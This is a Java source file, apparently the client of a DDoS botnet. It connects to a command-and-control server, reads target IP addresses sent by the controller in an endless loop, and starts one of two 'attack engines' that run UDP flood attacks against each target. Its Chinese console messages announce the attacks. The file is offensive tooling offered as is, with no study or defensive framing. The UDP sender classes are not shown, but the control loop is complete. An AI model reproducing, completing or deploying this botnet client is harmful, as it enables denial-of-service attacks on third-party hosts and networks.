package com.zhanyingwl.www;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;

/**
 * @ClassName : doConnect
 * @Description : 启动类
 * @Author : 战鹰
 * @Version: 2.0
 */

public class doConnect {
    static String ServerName = "localhost";
    static int ServerPort = 8090;
    static String onegetTargetHost;
    static String twogetTargetHost;

    public static void main(String[] args) {
        while (true) {
            try {
                InetAddress address = InetAddress.getByName(ServerName);
                String hostIPAddress = address.getHostAddress(); // DNS解析到控制端服务器IP地址
                if (hostIPAddress.equals("127.0.0.1")) {
                    System.out.println("解析成功！主控端认证地址为 " + hostIPAddress + " ，客户端开始请求建立连接！");
                    Socket socket = new Socket(ServerName, ServerPort);
                    while (true) {
                        Thread.sleep(1000);
                        InputStream is = socket.getInputStream();
                        BufferedReader br = new BufferedReader(new InputStreamReader(is));
                        onegetTargetHost = br.readLine();
                        switch (onegetTargetHost) {
                            case "none":
                                System.out.println("没啥事儿！");
                                System.out.println("GO！");
                                System.out.println("--------------------------------------");
                                break;
                            case "":
                                twoUdpSend udpSend2 = new twoUdpSend();
                                udpSend2.start();
                                for (int i = 0; i < 10; i++) {
                                    Thread.sleep(1000);
                                    System.out.println("使用第二攻击引擎执行UDP攻击中。。。");
                                }
                                udpSend2.interrupt();
                                break;
                            default:
                                System.out.println("客户端接收到目标IP：" + onegetTargetHost);
                                twogetTargetHost = onegetTargetHost;
                                System.out.println("已将目标IP载入第二攻击引擎！第二攻击引擎目标IP：" + twogetTargetHost);
                                oneUdpSend udpSend1 = new oneUdpSend();
                                udpSend1.start();
                                for (int i = 0; i < 10; i++) {
                                    Thread.sleep(1000);
                                    System.out.println("使用第一攻击引擎执行UDP攻击中。。。");
                                }
                                udpSend1.interrupt();
                        }
                    }
                } else {
                    System.out.println("系统错误！");
                }
            } catch (InterruptedException | IOException e) {
                e.printStackTrace();
                System.out.println("系统错误！");
            }
        }
    }
}